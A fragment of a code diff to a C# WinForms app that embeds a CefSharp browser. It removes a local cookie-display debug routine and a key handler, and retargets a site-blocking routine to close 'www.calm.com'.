-                foreach (var nameValue in all_cookies)
-                    sb.AppendLine(nameValue.Item1 + " = " + nameValue.Item2);
-                BeginInvoke(new MethodInvoker(() => { MessageBox.Show(sb.ToString()); }));
-            });
-
-            Cef.GetGlobalCookieManager().VisitAllCookies(visitor);
-        }
 
         private void IconButtonConfirmClose_Click(object sender, EventArgs e)
         {
@@ -2602,43 +2163,21 @@ namespace Asgard
             PanelConfirm.Hide();
         }
 
-        private void TextBoxValhalla_KeyDown(object sender, KeyEventArgs e)
-        {
-            if (e.Control && e.KeyCode == Keys.C)
-            {
-                e.SuppressKeyPress = false;
-            }
-            else if (e.Control && e.KeyCode == Keys.X)
-            {
-                e.SuppressKeyPress = false;
-            }
-            else
-            {
-                e.SuppressKeyPress = true;
-                return;
-            }
-        }
-
         private async Task Block()
         {
-            bool block = await Asatru.BlockAesir(UserId, 1, Token);
+            bool block = await Asatru.BlockAesir(UserId, 3, Token);
             if (block)
             {
                 PanelBlockGate.Show();
                 await IconButtonBlockGateClose.OnClickAsync();
-                Owner.HideIconActive("odin");
+                Owner.HideIconActive("friggCalm");
                 PanelBlockGate.Hide();
                 if (browser != null)
                 {
-                    await browser.Kill(web);
+                    await browser.Kill("www.calm.com");
                 }
                 this.Close();
             }
-        }
-
-        private void PanelBlockGate_Paint(object sender, PaintEventArgs e)
-        {
-
         }
     }
 }
